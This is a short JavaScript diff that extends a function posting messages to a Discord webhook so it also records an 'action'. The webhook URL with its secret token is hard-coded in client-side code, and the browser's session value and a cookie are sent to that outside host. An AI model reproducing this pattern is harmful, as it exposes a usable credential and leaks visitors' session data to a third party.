@@ -1,11 +1,14 @@
-function sendMessage(comment) {
+const queryString = window.location.search;
+const urlParams = new URLSearchParams(queryString);
+
+function sendMessage(action, comment) {
   var request = new XMLHttpRequest();
   request.open('POST', 'https://discord.com/api/webhooks/804004480089325578/HKzwR1Np63ou6s4kEW62jvFkjNMGDcQUZGc-bgxSXVzZyKmZEQnYgSKZQR24vpEjAJ0M');
   request.setRequestHeader('Content-type', 'application/json');
   var cookie = checkCookie();
   var params = {
     'username': sessionStorage.getItem('session'),
-    'content': `\`\`\`js\nDate: ${cookie}\nURL: ${checkURL()}\nComment: ${comment}\`\`\``
+    'content': `\`\`\`js\nDate: ${cookie}\nURL: ${checkURL()}\nAction: ${action}\nComment: ${comment}\`\`\``
   }
   request.send(JSON.stringify(params));
 }
